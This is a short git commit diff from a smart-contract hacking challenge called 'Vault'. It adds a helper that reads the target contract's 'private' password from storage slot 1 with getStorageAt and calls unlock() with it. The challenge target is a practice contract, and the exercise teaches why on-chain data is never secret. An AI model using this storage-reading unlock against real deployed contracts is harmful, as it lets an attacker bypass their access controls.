8ce76ad602f5f751222960f7485dc4bd1a0b910a
emanherawy <eman.herawy@gmail.com>
2023-01-24 10:43:39 +0200

    challange 4

--- contracts/4. Vault/VaultHelper.ts
+++ contracts/4. Vault/VaultHelper.ts
@@ -8,6 +8,12 @@ const helper = async (victim: any) => {
     Unlock the vault by somehow reading the private password from 
     Vault directly
   */
+  //const loc0 = await ethers.provider.getStorageAt(victim.address, 0);
+  const loc1 = await ethers.provider.getStorageAt(victim.address, 1);
+  // console.log({ loc0, loc1 });
+  // let stringValue = ethers.utils.toUtf8String(loc1.substring(0,46));
+  // console.log({ stringValue });
+  await victim.unlock(loc1 /*.substring(0,46)*/);
 };
 
 export default helper;
